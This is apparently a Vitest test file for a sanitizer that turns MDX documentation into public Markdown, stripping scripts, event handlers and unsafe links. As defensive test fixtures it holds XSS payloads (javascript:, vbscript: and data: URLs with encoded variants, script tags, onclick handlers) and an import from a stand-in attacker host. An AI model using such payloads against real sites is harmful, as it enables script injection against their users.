import { describe, expect, it } from 'vitest';
import { normalizePublicMarkdownContent, portablePublicMdxMarkdown } from './public-markdown-content';

describe('public Markdown content normalization', () => {
  it.each(['$&', '$$', "$'", '$`'])('preserves replacement metacharacters in literal public code: %s', (token) => {
    const source = [`Example: \`\`literal ${token}\`\``, '', '~~~mdx', `literal ${token}`, '~~~'].join('\n');
    expect(normalizePublicMarkdownContent(source)).toBe(source);
  });

  it('projects supported MDX while removing executable imports and raw active HTML', () => {
    const source = `import Exploit from "https://attacker.example/exploit.js"

<Callout type="tip">**Portable guidance**</Callout>

<script>globalThis.stolen = true</script>

<Unknown onclick="run()">Readable</Unknown>

\`\`\`mdx
import Example from './example'
<Callout>Code sample</Callout>
\`\`\``;

    const normalized = normalizePublicMarkdownContent(source);

    // A callout becomes a real blockquote: its marker isn't escaped.
    expect(normalized).toContain('> **Portable guidance**');
    expect(normalized).not.toContain('&gt; **Portable guidance**');
    expect(normalized).toContain('&lt;Unknown onclick=&quot;run()&quot;&gt;Readable&lt;/Unknown&gt;');
    expect(normalized).toContain("```mdx\nimport Example from './example'\n<Callout>Code sample</Callout>\n```");
    expect(normalized).not.toContain('Exploit');
    expect(normalized).not.toContain('globalThis.stolen');
    expect(normalized).not.toContain('<script>');
  });

  it('preserves literal HTML and JSON in variable-length inline code spans', () => {
    const source = [
      'Use `<script>alert(1)</script>` with `{"mode":"safe"}` as literal examples.',
      'A double delimiter preserves ``literal `tick`, <tag>, and {value}`` exactly.',
      '<script>globalThis.stolen = true</script>',
    ].join('\n');

    const normalized = normalizePublicMarkdownContent(source);

    expect(normalized).toContain('`<script>alert(1)</script>`');
    expect(normalized).toContain('`{"mode":"safe"}`');
    expect(normalized).toContain('``literal `tick`, <tag>, and {value}``');
    expect(normalized).not.toContain('globalThis.stolen');
  });

  it('keeps tooltip text in parentheses after the inline content', () => {
    expect(portablePublicMdxMarkdown('An <Tooltip tip="Application programming interface">API</Tooltip> call.')).toBe(
      'An API (Application programming interface) call.',
    );
    // Projected like the other attributes: Markdown syntax is escaped, line breaks collapse.
    expect(portablePublicMdxMarkdown('<Tooltip tip="Uses *stars* and\n[links]">term</Tooltip>')).toBe('term (Uses \\*stars\\* and \\[links\\])');
    expect(portablePublicMdxMarkdown('A <Tooltip tip="">term</Tooltip> and a <Tooltip>word</Tooltip>.')).toBe('A term and a word.');
  });

  it('keeps braces in projected attribute text through the whole pipeline, while authored expressions stay out', () => {
    expect(normalizePublicMarkdownContent('<Tooltip tip="Send {id} and {token}">API</Tooltip> with {secretValue}.')).toBe(
      'API (Send \\{id\\} and \\{token\\}) with .',
    );
    expect(normalizePublicMarkdownContent('<ParamField name="items[{index}]" type="string">\n\nOne item.\n\n</ParamField>')).toBe(
      '#### items\\[\\{index\\}\\] · string\n\nOne item.',
    );
    // MDX escapes stay literal; an escaped backslash before an expression does not hide it.
    expect(normalizePublicMarkdownContent('Literal \\{braces\\} and \\\\{hidden}.')).toBe('Literal \\{braces\\} and \\\\.');
  });

  it('decodes the entities the editor writes in attributes once, so they are not escaped twice', () => {
    expect(normalizePublicMarkdownContent('<Tooltip tip="R&amp;D &quot;labs&quot;">API</Tooltip> and R&D.')).toBe(
      'API (R&amp;D &quot;labs&quot;) and R&amp;D.',
    );
    // An entity that was itself escaped stays literal text.
    expect(portablePublicMdxMarkdown('<Tooltip tip="&amp;lt;b&amp;gt;">tag</Tooltip>')).toBe('tag (&lt;b&gt;)');
  });

  it('reads an attribute value containing ">" whole, and escapes it once for each output', () => {
    // Markdown for exports escapes `<` and `>` in attribute text, so it can't form an autolink or a tag.
    expect(portablePublicMdxMarkdown('<Tooltip tip="a > b">API</Tooltip>')).toBe('API (a \\> b)');
    expect(portablePublicMdxMarkdown('<Tooltip tip="<javascript:alert(1)>">T</Tooltip>')).toBe('T (\\<javascript:alert(1)\\>)');
    // `.md` escapes HTML afterwards, so a backslash there would show.
    expect(normalizePublicMarkdownContent('<Tooltip tip="a > b">API</Tooltip>')).toBe('API (a &gt; b)');
    expect(portablePublicMdxMarkdown('<Frame caption="When x > 1">\n\n![Chart](/c.png)\n\n</Frame>')).toBe('![Chart](/c.png)\n\n_When x \\> 1_');
  });

  it('projects components around code blocks, and keeps the code literal', () => {
    expect(normalizePublicMarkdownContent('<CodeGroup>\n\n```js title="a.js"\nconst a = 1 < 2;\n```\n\n</CodeGroup>')).toBe(
      '```js title="a.js"\nconst a = 1 < 2;\n```',
    );
    // Blank-line runs are compared collapsed: a code block keeps its own trailing newline.
    expect(
      normalizePublicMarkdownContent('<Card title="T" href="/x">\n\n```sh\nnpm i <pkg>\n```\n\n</Card>\n\nAfter.').replace(/\n{3,}/g, '\n\n'),
    ).toBe('### [T](/x)\n\n```sh\nnpm i <pkg>\n```\n\nAfter.');
  });

  it('keeps an unclosed active tag from hiding the prose after the next code block', () => {
    const output = normalizePublicMarkdownContent('<style>unclosed\n\n```txt\nkept code\n```\n\nKept prose.');
    expect(output).toContain('kept code');
    expect(output).toContain('Kept prose.');
    expect(output).not.toContain('unclosed');
  });

  it('keeps blockquotes, including the ones callouts become, as Markdown', () => {
    expect(normalizePublicMarkdownContent('<Note>\n\nhello\n\n</Note>\n\n> quoted & kept\n> > nested')).toBe(
      '> hello\n\n> quoted &amp; kept\n> > nested',
    );
  });

  it('keeps a "}" that closes nothing', () => {
    expect(normalizePublicMarkdownContent('Literal \\{y} and a} b, while {hidden} goes.')).toBe('Literal \\{y} and a} b, while  goes.');
  });

  it('reads a quote that is not closed on its line as text, so the tag ends where it should', () => {
    expect(portablePublicMdxMarkdown("<Card title=don't>\n\nBody\n\n</Card>\n\nIt's after <Badge>B</Badge>.")).toBe("Body\n\nIt's after **B**.");
  });

  it.each([
    ['<javascript:alert(1)>', 'angle brackets'],
    ['/a b', 'a space'],
    ['/a)x', 'a parenthesis'],
  ])('handles the destination %j (%s) without breaking or unsafe links', (href, _label) => {
    const output = portablePublicMdxMarkdown(`<Button href="${href}">Go</Button>`);
    expect(output).not.toContain('javascript');
    expect(output).not.toMatch(/\]\([^)]*[\s<>][^)]*\)/);
  });

  it('percent-encodes spaces and parentheses in a projected destination', () => {
    expect(portablePublicMdxMarkdown('<Button href="/a b(c)">Go</Button>')).toBe('[Go](/a%20b%28c%29)');
  });

  it('projects atoms written as an empty pair like self-closing ones', () => {
    expect(portablePublicMdxMarkdown('<FileTree>\n<File name="a.ts"></File>\n<File name="b.ts" />\n</FileTree>')).toBe('- `a.ts`\n- `b.ts`');
    expect(portablePublicMdxMarkdown('Before <Icon icon="star"></Icon><Icon icon="rocket" /> after.')).toBe('Before  after.');
    expect(
      portablePublicMdxMarkdown('<RelatedCard title="A" href="/a" />\n<RelatedCard title="B" description="Second">\n\nBody of B.\n\n</RelatedCard>'),
    ).toBe('- [A](/a)\n- B — Second\n  Body of B.');
  });

  it('keeps a decoded "<script>" in a title from hiding the rest of the page', () => {
    const output = normalizePublicMarkdownContent('<Card title="&lt;script&gt;">Body</Card>\n\nEnding text.');
    expect(output).toContain('&lt;script&gt;');
    expect(output).toContain('Body');
    expect(output).toContain('Ending text.');
  });

  it('keeps a destination that tries to close the link and open another inside one link', () => {
    const output = portablePublicMdxMarkdown('<Button href="/) [Injected](javascript:alert%281%29">Go</Button>');
    expect(output).toBe('[Go](/%29%20[Injected]%28javascript:alert%281%29)');
    expect(output.match(/\]\(/g)).toHaveLength(1);
  });

  it('quotes every line of a code block inside a callout', () => {
    const quoted = '> ```html\n> <div>hi</div>\n> line2\n> ```';
    expect(portablePublicMdxMarkdown('<Note>\nRun this:\n\n```html\n<div>hi</div>\nline2\n```\n\nafter\n</Note>\n\nnext para')).toContain(quoted);
    const output = normalizePublicMarkdownContent('<Note>\nRun this:\n\n```html\n<div>hi</div>\nline2\n```\n\nafter\n</Note>\n\nnext para');
    expect(output).toContain(quoted);
    expect(output).toContain('> after');
    expect(output.endsWith('next para')).toBe(true);
    expect(output.match(/```/g)).toHaveLength(2);
    // Nested callouts quote their code once per level.
    expect(portablePublicMdxMarkdown('<Note>\n<Warning>\n\n```js\nconst a = 1;\n```\n\n</Warning>\n</Note>')).toContain(
      '> > ```js\n> > const a = 1;\n> > ```',
    );
  });

  it('indents every line of code inside a Folder or a RelatedCard', () => {
    // A code block keeps its own trailing line end.
    expect(portablePublicMdxMarkdown('<Folder name="src">\n\n```txt\na\nb\n```\n\n</Folder>').trimEnd()).toBe(
      '- **src/**\n  ```txt\n  a\n  b\n  ```',
    );
    expect(portablePublicMdxMarkdown('<RelatedCard title="R">\n\nOne\nTwo\n\n</RelatedCard>')).toBe('- R\n  One\n  Two');
  });

  it('puts code in projected attribute text back instead of leaking a placeholder', () => {
    const output = normalizePublicMarkdownContent('<Card title="Use `x`" href="/a">\n\nBody\n\n</Card> and <Tooltip tip="Run `npm i`">T</Tooltip>.');
    expect(output).toContain('Use `x`');
    expect(output).toContain('T (Run `npm i`)');
    expect(output).not.toMatch(/\uE000|\uE001|\uE002|\uE003/);
  });

  it('keeps projected attribute text out of the active-markup scan', () => {
    expect(normalizePublicMarkdownContent('<Tooltip tip="The &lt;style&gt; element">CSS</Tooltip> and more text.\n\nNext paragraph.')).toBe(
      'CSS (The &lt;style&gt; element) and more text.\n\nNext paragraph.',
    );
    expect(normalizePublicMarkdownContent('<Card title="Use <script> carefully">\n\nBody text.\n\n</Card>\n\nAfter.')).toBe(
      '### Use &lt;script&gt; carefully\n\nBody text.\n\nAfter.',
    );
    // Authored active markup is still removed.
    expect(normalizePublicMarkdownContent('Before <style>p { color: red }</style> after.')).not.toContain('color');
  });

  it('leaves components written as examples in code untouched', () => {
    const source = 'Write `<Icon icon="star"></Icon>` inline.\n\n```mdx\n<FileTree>\n<File name="example.ts"></File>\n</FileTree>\n```';
    expect(portablePublicMdxMarkdown(source)).toBe(source);
  });

  it('names a field by its location prop and keeps its flags', () => {
    expect(
      normalizePublicMarkdownContent(
        '<ParamField query="limit" type="integer" required default="10" deprecated>\n\nItems per page.\n\n</ParamField>',
      ),
    ).toBe('#### limit · integer · required · default: 10 · deprecated\n\nItems per page.');
    // A flag's name inside another attribute's value isn't the flag.
    expect(portablePublicMdxMarkdown('<ParamField path="id" description="is required here" required={false}>\n\nText.\n\n</ParamField>')).toBe(
      '#### id\n\nText.',
    );
  });

  it.each([
    'javascript:alert(1)',
    'JavaScript:alert(1)',
    ' java\tscript:alert(1)',
    '&#106;avascript:alert(1)',
    '&#x6A;avascript:alert(1)',
    'javascript&colon;alert(1)',
    'javascript\\:alert(1)',
    'vbscript:x',
    'data:text/html,x',
  ])('projects no link for the unsafe destination %j', (href) => {
    const output = portablePublicMdxMarkdown(
      `<Button href="${href}">Go</Button> <Card title="Card" href="${href}">\n\nBody\n\n</Card> <RelatedCard title="Related" href="${href}" />`,
    );
    expect(output).not.toMatch(/\]\(/);
    expect(output).toContain('Go');
    expect(output).toContain('Card');
    expect(output).toContain('Related');
  });

  it.each(['/guide', 'guide/setup', '#install', 'https://example.com/a?b=1', 'mailto:team@example.com', 'tel:+15550100'])(
    'keeps the safe destination %j',
    (href) => {
      expect(portablePublicMdxMarkdown(`<Button href="${href}">Go</Button>`)).toBe(`[Go](${href})`);
    },
  );

  it('keeps underlined text, and subscript and superscript as plain inline HTML so their meaning survives', () => {
    expect(normalizePublicMarkdownContent('A <u>underlined</u> word, H<sub>2</sub>O and x<sup>2</sup>.')).toBe(
      'A underlined word, H<sub>2</sub>O and x<sup>2</sup>.',
    );
    expect(normalizePublicMarkdownContent('10<SUP>-3</SUP> and x<sub>i</sub>')).toBe('10<sup>-3</sup> and x<sub>i</sub>');
    // Attributes are dropped, and code examples stay literal.
    expect(normalizePublicMarkdownContent('<u class="x">styled</u>, x<sup onclick="alert(1)" class="y">2</sup> and `<u>code</u>`')).toBe(
      'styled, x<sup>2</sup> and `<u>code</u>`',
    );
  });

  it('pairs subscript and superscript across the lines of one paragraph, not across paragraphs', () => {
    expect(normalizePublicMarkdownContent('x<sub>i\nj</sub> done.')).toBe('x<sub>i\nj</sub> done.');
    expect(normalizePublicMarkdownContent('x<sub>i\n\nj</sub>')).toBe('xi\n\nj');
  });

  it('reads formatting tags whose attribute values contain ">" whole', () => {
    expect(normalizePublicMarkdownContent('x<sup title="a > b">2</sup> and <u title=\'c > d\'>under</u>.')).toBe('x<sup>2</sup> and under.');
  });

  it('lets no other markup through subscript or superscript', () => {
    // An unmatched tag keeps only its text.
    expect(normalizePublicMarkdownContent('x<sup>2 and H<sub>2')).toBe('x2 and H2');
    // Anything inside a pair is still escaped.
    expect(normalizePublicMarkdownContent('x<sup><b onmouseover="a()">2</b></sup>')).toBe(
      'x<sup>&lt;b onmouseover=&quot;a()&quot;&gt;2&lt;/b&gt;</sup>',
    );
    // Correctly nested pairs keep their notation; crossed ones keep only what nests.
    expect(normalizePublicMarkdownContent('x<sub>i<sup>2</sup></sub>, a<sub>1<sup>2</sup></sub> and x<sup>a<sub>b</sub>c</sup>')).toBe(
      'x<sub>i<sup>2</sup></sub>, a<sub>1<sup>2</sup></sub> and x<sup>a<sub>b</sub>c</sup>',
    );
    expect(normalizePublicMarkdownContent('a<sub>b<sup>c</sub>d</sup> and e<sub>f</sup>g</sub>')).toBe('ab<sup>cd</sup> and e<sub>fg</sub>');
    // Escaped text that spells a tag is not turned back into one.
    expect(normalizePublicMarkdownContent('&lt;sup&gt;2&lt;/sup&gt;')).toBe('&amp;lt;sup&amp;gt;2&amp;lt;/sup&amp;gt;');
  });
});
